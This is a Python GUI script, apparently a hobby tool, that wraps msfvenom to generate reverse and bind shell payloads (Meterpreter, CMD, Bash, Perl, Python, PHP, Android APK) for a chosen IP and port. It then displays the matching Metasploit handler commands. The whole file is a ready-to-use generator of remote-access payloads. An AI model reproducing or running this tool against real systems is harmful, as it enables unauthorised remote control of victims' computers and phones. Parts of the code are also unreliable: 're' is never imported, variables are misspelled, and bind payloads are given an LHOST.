#!/usr/bin/env python

# Created By Reza Sarvani

from tkinter import *
import subprocess

# ============== Settings ================
root = Tk()
root.title("Nochi Payload Maker By: Reza Sarvani")
root.geometry('400x330')  # set up the size
color = 'gray55'
root.configure(bg=color)
root.resizable(width=False, height=False)

name_label = Label(root,  font=('arial', 10, 'bold'), text="Reza Sarvani", bg=color, fg="black")
name_label.place(x=0, y=310)

first_create = True
# ============== Functions ===============
def create_payload():
	payload = pay_mode.get()
	ip= ip_entry.get()
	if ip:
		pass
	else:
		ip = ip_mod.get()
		ip = ip[1:]
	port = port_entry.get()
	filename = filename_entry.get()
	if payload == "Linux Meterpreter reverse shell x86 multi stage":
		start()
		pay_exec = subprocess.call(["msfvenom", "-p", "linux/x86/meterpreter/reverse_tcp", f"LHOST={str(ip)}", f"LPORT={str(port)}", "-f", "elf", "-o", f"{filename}.elf"])
		msf("linux/x86/meterpreter/reverse_tcp")

	elif payload == "Linux Meterpreter bind shell x86 multi stage":
		start()
		pay_exec = subprocess.call(["msfvenom", "-p", "linux/x86/meterpreter/bind_tcp", f"LHOST={ip}", f"LPORT={port}", "-f", "elf", "-o", f"{filename}.elf"])
		msf(" linux/x86/meterpreter/bind_tcp")

	elif payload == "Linux bind shell x64 single stage":
		start()
		pay_exec = subprocess.call(["msfvenom", "-p", "linux/x64/shell_bind_tcp", f"LHOST={ip}", f"LPORT={port}", "-f", "elf", "-o", f"{filename}.elf"])
		msf("linux/x64/shell_bind_tcp")

	elif payload == "Linux reverse shell x64 single stage":
		start()
		pay_exec = subprocess.call(["msfvenom", "-p", "linux/x64/shell_reverse_tcp", f"LHOST={ip}", f"LPORT={port}", "-f", "elf", "-o", f"{filename}.elf"])
		msf("linux/x64/shell_reverse_tcp")

	elif payload == "Windows Meterpreter reverse shell":
		start()
		pay_exec = subprocess.call(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", f"LHOST={ip}", f"LPORT={port}", "-f", "exe", "-o", f"{filename}.exe"])
		msf("windows/meterpreter/reverse_tcp")
	
	elif payload == "Windows Meterpreter http reverse shell":
		start()
		pay_exec = subprocess.call(["msfvenom", "-p", "windows/meterpreter_reverse_http", f"LHOST={ip}", f"LPORT={port}", "HttpUserAgent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36'", "-f", "exe", "-o", f"{filename}.exe"])
		msf("windows/meterpreter_reverse_http")

	elif payload == "Windows Meterpreter bind shell":
		start()
		ay_exec = subprocess.call(["msfvenom", "-p", "windows/meterpreter/bind_tcp", f"LHOST={ip}", f"LPORT={port}", "-f", "exe", "-o", f"{filename}.exe"])
		msf("windows/meterpreter/bind_tcp")

	elif payload == "Windows CMD Multi Stage":
		start()
		ay_exec = subprocess.call(["msfvenom", "-p", "windows/shell/reverse_tcp", f"LHOST={ip}", f"LPORT={port}", "-f", "exe", "-o", f"{filename}.exe"])
		msf("windows/shell/reverse_tcp")

	elif payload == "Mac Reverse Shell":
		start()
		ay_exec = subprocess.call(["msfvenom", "-p", "osx/x86/shell_reverse_tcp", f"LHOST={ip}", f"LPORT={port}", "-f", "macho", "-o", f"{filename}.macho"])
		msf("osx/x86/shell_reverse_tcp")

	elif payload == "Mac Bind shell":
		start()
		ay_exec = subprocess.call(["msfvenom", "-p", "osx/x86/shell_bind_tcp", f"LHOST={ip}", f"LPORT={port}", "-f", "macho", "-o", f"{filename}.macho"])
		msf("osx/x86/shell_bind_tcp")

	elif payload == "Python Shell":
		start()
		ay_exec = subprocess.call(["msfvenom", "-p", "cmd/unix/reverse_python", f"LHOST={ip}", f"LPORT={port}", "-f", "raw", "-o", f"{filename}.py"])
		msf("cmd/unix/reverse_python")

	elif payload == "BASH Shell":
		start()
		ay_exec = subprocess.call(["msfvenom", "-p", "cmd/unix/reverse_bash", f"LHOST={ip}", f"LPORT={port}", "-f", "raw", "-o", f"{filename}.sh"])
		msf("cmd/unix/reverse_bash")

	elif payload == "PERL Shell":
		start()
		ay_exec = subprocess.call(["msfvenom", "-p", "cmd/unix/reverse_perl", f"LHOST={ip}", f"LPORT={port}", "-f", "raw", "-o", f"{filename}.pl"])
		msf("cmd/unix/reverse_perl")

	elif payload == "Php Reverse Shell":
		start()
		ay_exec = subprocess.call(["msfvenom", "-p", "php/reverse_php", f"LHOST={ip}", f"LPORT={port}", "-f", "raw", "-o", f"{filename}.php"])
		msf("php/reverse_php")

	elif payload == "Android Meterpreter reverse shell":
		start()
		ay_exec = subprocess.call(["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={ip}", f"LPORT={port}", "R", "-o", f"{filename}.apk"])
		msf("android/meterpreter/reverse_tcp")


def msf(payload):
	global first_create
	global exec_label3
	print("[+] Finished Creating The Payload")
	if first_create:
		exec_label2 = Label(root,  font=('arial', 9, 'bold'), text="> use exploit/multi/handler", bg=color, fg="red")
		exec_label2.place(x=0, y=260)
		exec_label3 = Label(root,  font=('arial', 9, 'bold'), text=f"> set payload {payload}", bg=color, fg="red")
		exec_label3.place(x=0, y=280)
		first_create = False
	else:
		exec_label3.config(text=f"> set payload {payload}")

def start():
	print("[+] Starting The Proccess Of Creating The Payload")
	print("[+] Please Be Patient")

# ============== Payload Select ================
pay_label = Label(root,  font=('arial', 12, 'bold'), text="Select Your Payload", bg=color, fg="black")
pay_label.place(x=130, y=0)

pay_mode = StringVar(root)
pay_mode.set("Choose...")

pay_list=[
"Linux Meterpreter reverse shell x86 multi stage",
"Linux Meterpreter bind shell x86 multi stage",
"Linux bind shell x64 single stage",
"Linux reverse shell x64 single stage",
"Windows Meterpreter reverse shell",
"Windows Meterpreter http reverse shell",
"Windows Meterpreter bind shell",
"Windows CMD Multi Stage",
"Android Meterpreter reverse shell",
"Mac Reverse Shell",
"Mac Bind shell",
"Python Shell",
"BASH Shell",
"PERL Shell",
"Php Reverse Shell",
]
pay_drop = OptionMenu(root, pay_mode, *pay_list)
pay_drop.place(x=0,y=30)

# ============== IP Drop Down Select ================
ip_mod = StringVar(root)
ip_mod.set("Internal IP")
res = subprocess.check_output(["ifconfig"])
res = str(res)
ip_list2 = re.findall("inet\s+\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", res)
ip_list=[]
for ip in ip_list2:
	ip_list.append(ip[4:])
ip_drop = OptionMenu(root, ip_mod, *ip_list)
ip_drop.place(x=0,y=100)
# ============== IP/PORT Select ================
ip_label = Label(root,  font=('arial', 12, 'bold'), text="Enter Your IP Address", bg=color, fg="black")
ip_label.place(x=120, y=70)

ip_entry = Entry(root, bd=7)
ip_entry.place(x=115,y=100)

port_label = Label(root,  font=('arial', 12, 'bold'), text="Enter Your Port Number", bg=color, fg="black")
port_label.place(x=120, y=150)

port_entry = Entry(root, bd=7, width=7)
port_entry.place(x=166,y=177)
# ============== File Name Select ===============
filename_label = Label(root,  font=('arial', 12, 'bold'), text="File Name:", bg=color, fg="black")
filename_label.place(x=0, y=230)

filename_entry = Entry(root, bd=5)
filename_entry.place(x=115,y=225, height=30)
# ============== Button ===============
create_btn = Button(root, text="Create", font=('arial', 10, 'bold'),
                  highlightbackground=color,
                  command=lambda: create_payload())
create_btn.place(x=300,y=225)


root.mainloop()